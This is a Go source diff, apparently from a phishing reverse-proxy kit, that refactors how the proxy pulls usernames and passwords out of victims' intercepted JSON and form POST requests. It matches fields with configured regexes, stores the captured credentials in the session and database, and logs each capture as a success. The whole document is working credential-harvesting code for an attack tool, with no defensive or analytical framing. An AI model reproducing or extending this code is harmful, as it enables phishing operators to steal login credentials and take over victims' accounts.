@@ -229,28 +229,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							json, _ := ioutil.ReadAll(req.Body)
 							log.Debug("POST %s", json)
 
-							if pl.k_username == "json" {
-								if re, err := regexp.Compile(pl.re_username); err == nil {
-									um := re.FindStringSubmatch(string(json))
-									if um != nil && len(um) > 1 {
-										p.setSessionUsername(ps.SessionId, um[1])
-										log.Success("[%d] Username: [%s]", ps.Index, um[1])
-										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-											log.Error("database: %v", err)
-										}
+							if pl.username.tp == "json" {
+								um := pl.username.search.FindStringSubmatch(string(json))
+								if um != nil && len(um) > 1 {
+									p.setSessionUsername(ps.SessionId, um[1])
+									log.Success("[%d] Username: [%s]", ps.Index, um[1])
+									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+										log.Error("database: %v", err)
 									}
 								}
 							}
 
-							if pl.k_password == "json" {
-								if re, err := regexp.Compile(pl.re_password); err == nil {
-									pm := re.FindStringSubmatch(string(json))
-									if pm != nil && len(pm) > 1 {
-										p.setSessionPassword(ps.SessionId, pm[1])
-										log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-										if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-											log.Error("database: %v", err)
-										}
+							if pl.password.tp == "json" {
+								pm := pl.password.search.FindStringSubmatch(string(json))
+								if pm != nil && len(pm) > 1 {
+									p.setSessionPassword(ps.SessionId, pm[1])
+									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+										log.Error("database: %v", err)
 									}
 								}
 							}
@@ -260,27 +256,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if req.ParseForm() == nil {
 								for k, v := range req.Form {
 									log.Debug("POST %s = %s", k, v[0])
-									if (pl.k_re_username != nil && pl.k_re_username.MatchString(k)) || (pl.k_re_username == nil && k == pl.k_username) {
-										if re, err := regexp.Compile(pl.re_username); err == nil {
-											um := re.FindStringSubmatch(v[0])
-											if um != nil && len(um) > 1 {
-												p.setSessionUsername(ps.SessionId, um[1])
-												log.Success("[%d] Username: [%s]", ps.Index, um[1])
-												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-													log.Error("database: %v", err)
-												}
+									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
+										um := pl.username.search.FindStringSubmatch(v[0])
+										if um != nil && len(um) > 1 {
+											p.setSessionUsername(ps.SessionId, um[1])
+											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+												log.Error("database: %v", err)
 											}
 										}
 									}
-									if (pl.k_re_password != nil && pl.k_re_password.MatchString(k)) || (pl.k_re_password == nil && k == pl.k_password) {
-										if re, err := regexp.Compile(pl.re_password); err == nil {
-											pm := re.FindStringSubmatch(v[0])
-											if pm != nil && len(pm) > 1 {
-												p.setSessionPassword(ps.SessionId, pm[1])
-												log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-													log.Error("database: %v", err)
-												}
+									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
+										pm := pl.password.search.FindStringSubmatch(v[0])
+										if pm != nil && len(pm) > 1 {
+											p.setSessionPassword(ps.SessionId, pm[1])
+											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+												log.Error("database: %v", err)
 											}
 										}
 									}
